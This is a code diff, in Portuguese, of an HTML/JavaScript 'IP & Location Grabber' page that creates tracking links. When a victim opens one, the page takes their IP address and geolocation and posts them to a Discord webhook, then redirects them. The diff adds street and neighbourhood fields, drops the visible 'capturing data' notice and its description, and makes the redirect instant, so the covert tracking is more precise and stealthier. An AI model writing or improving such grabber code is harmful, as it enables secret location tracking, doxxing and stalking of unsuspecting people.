@@ -149,8 +149,8 @@
 </head>
 <body>
 
-  <h1>Discord IP & Location Grabber</h1>
-  <p class="description">Insira o link de destino e o webhook do canal do Discord para gerar um link grabber. Quando alguém clicar, seu IP e localização serão enviados para o canal via webhook, depois redirecionados.</p>
+  <h1>Noyato grabber 1.0</h1>
+  <p class="description">Insira o link de destino e o webhook do canal do Discord para gerar um link grabber.</p>
 
   <div class="container" id="input-container">
     <label for="destUrl">URL de destino (ex: https://example.com)</label>
@@ -237,9 +237,6 @@
         return;
       }
 
-      // Oculta interface e mostra mensagem de carregamento
-      inputContainer.innerHTML = "<p style='font-size:1.25rem; text-align:center; margin-bottom:1em;'>Carregando... Capturando dados e redirecionando.</p>";
-
       // Pega IP público usando api.ipify.org
       let ip;
       try {
@@ -269,6 +266,8 @@
         fields: [
           { name: "IP", value: ip, inline: true },
           { name: "Cidade", value: geo.city || "Desconhecido", inline: true },
+          { name: "Bairro", value: geo.suburb || "Desconhecido", inline: true },
+          { name: "Rua", value: geo.street || "Desconhecido", inline: true },
           { name: "Região", value: geo.region || "Desconhecido", inline: true },
           { name: "País", value: geo.country_name || "Desconhecido", inline: true },
           { name: "Código Postal", value: geo.postal || "Desconhecido", inline: true },
@@ -298,10 +297,8 @@
         console.error("Falha ao enviar o webhook:", err);
       }
 
-      // Redireciona para o link de destino após 1.5 segundos
-      setTimeout(() => {
-        window.location.href = decodeURIComponent(destUrl);
-      }, 1500);
+      // Redireciona diretamente para o link de destino
+      window.location.href = decodeURIComponent(destUrl);
     })();
   </script>
 
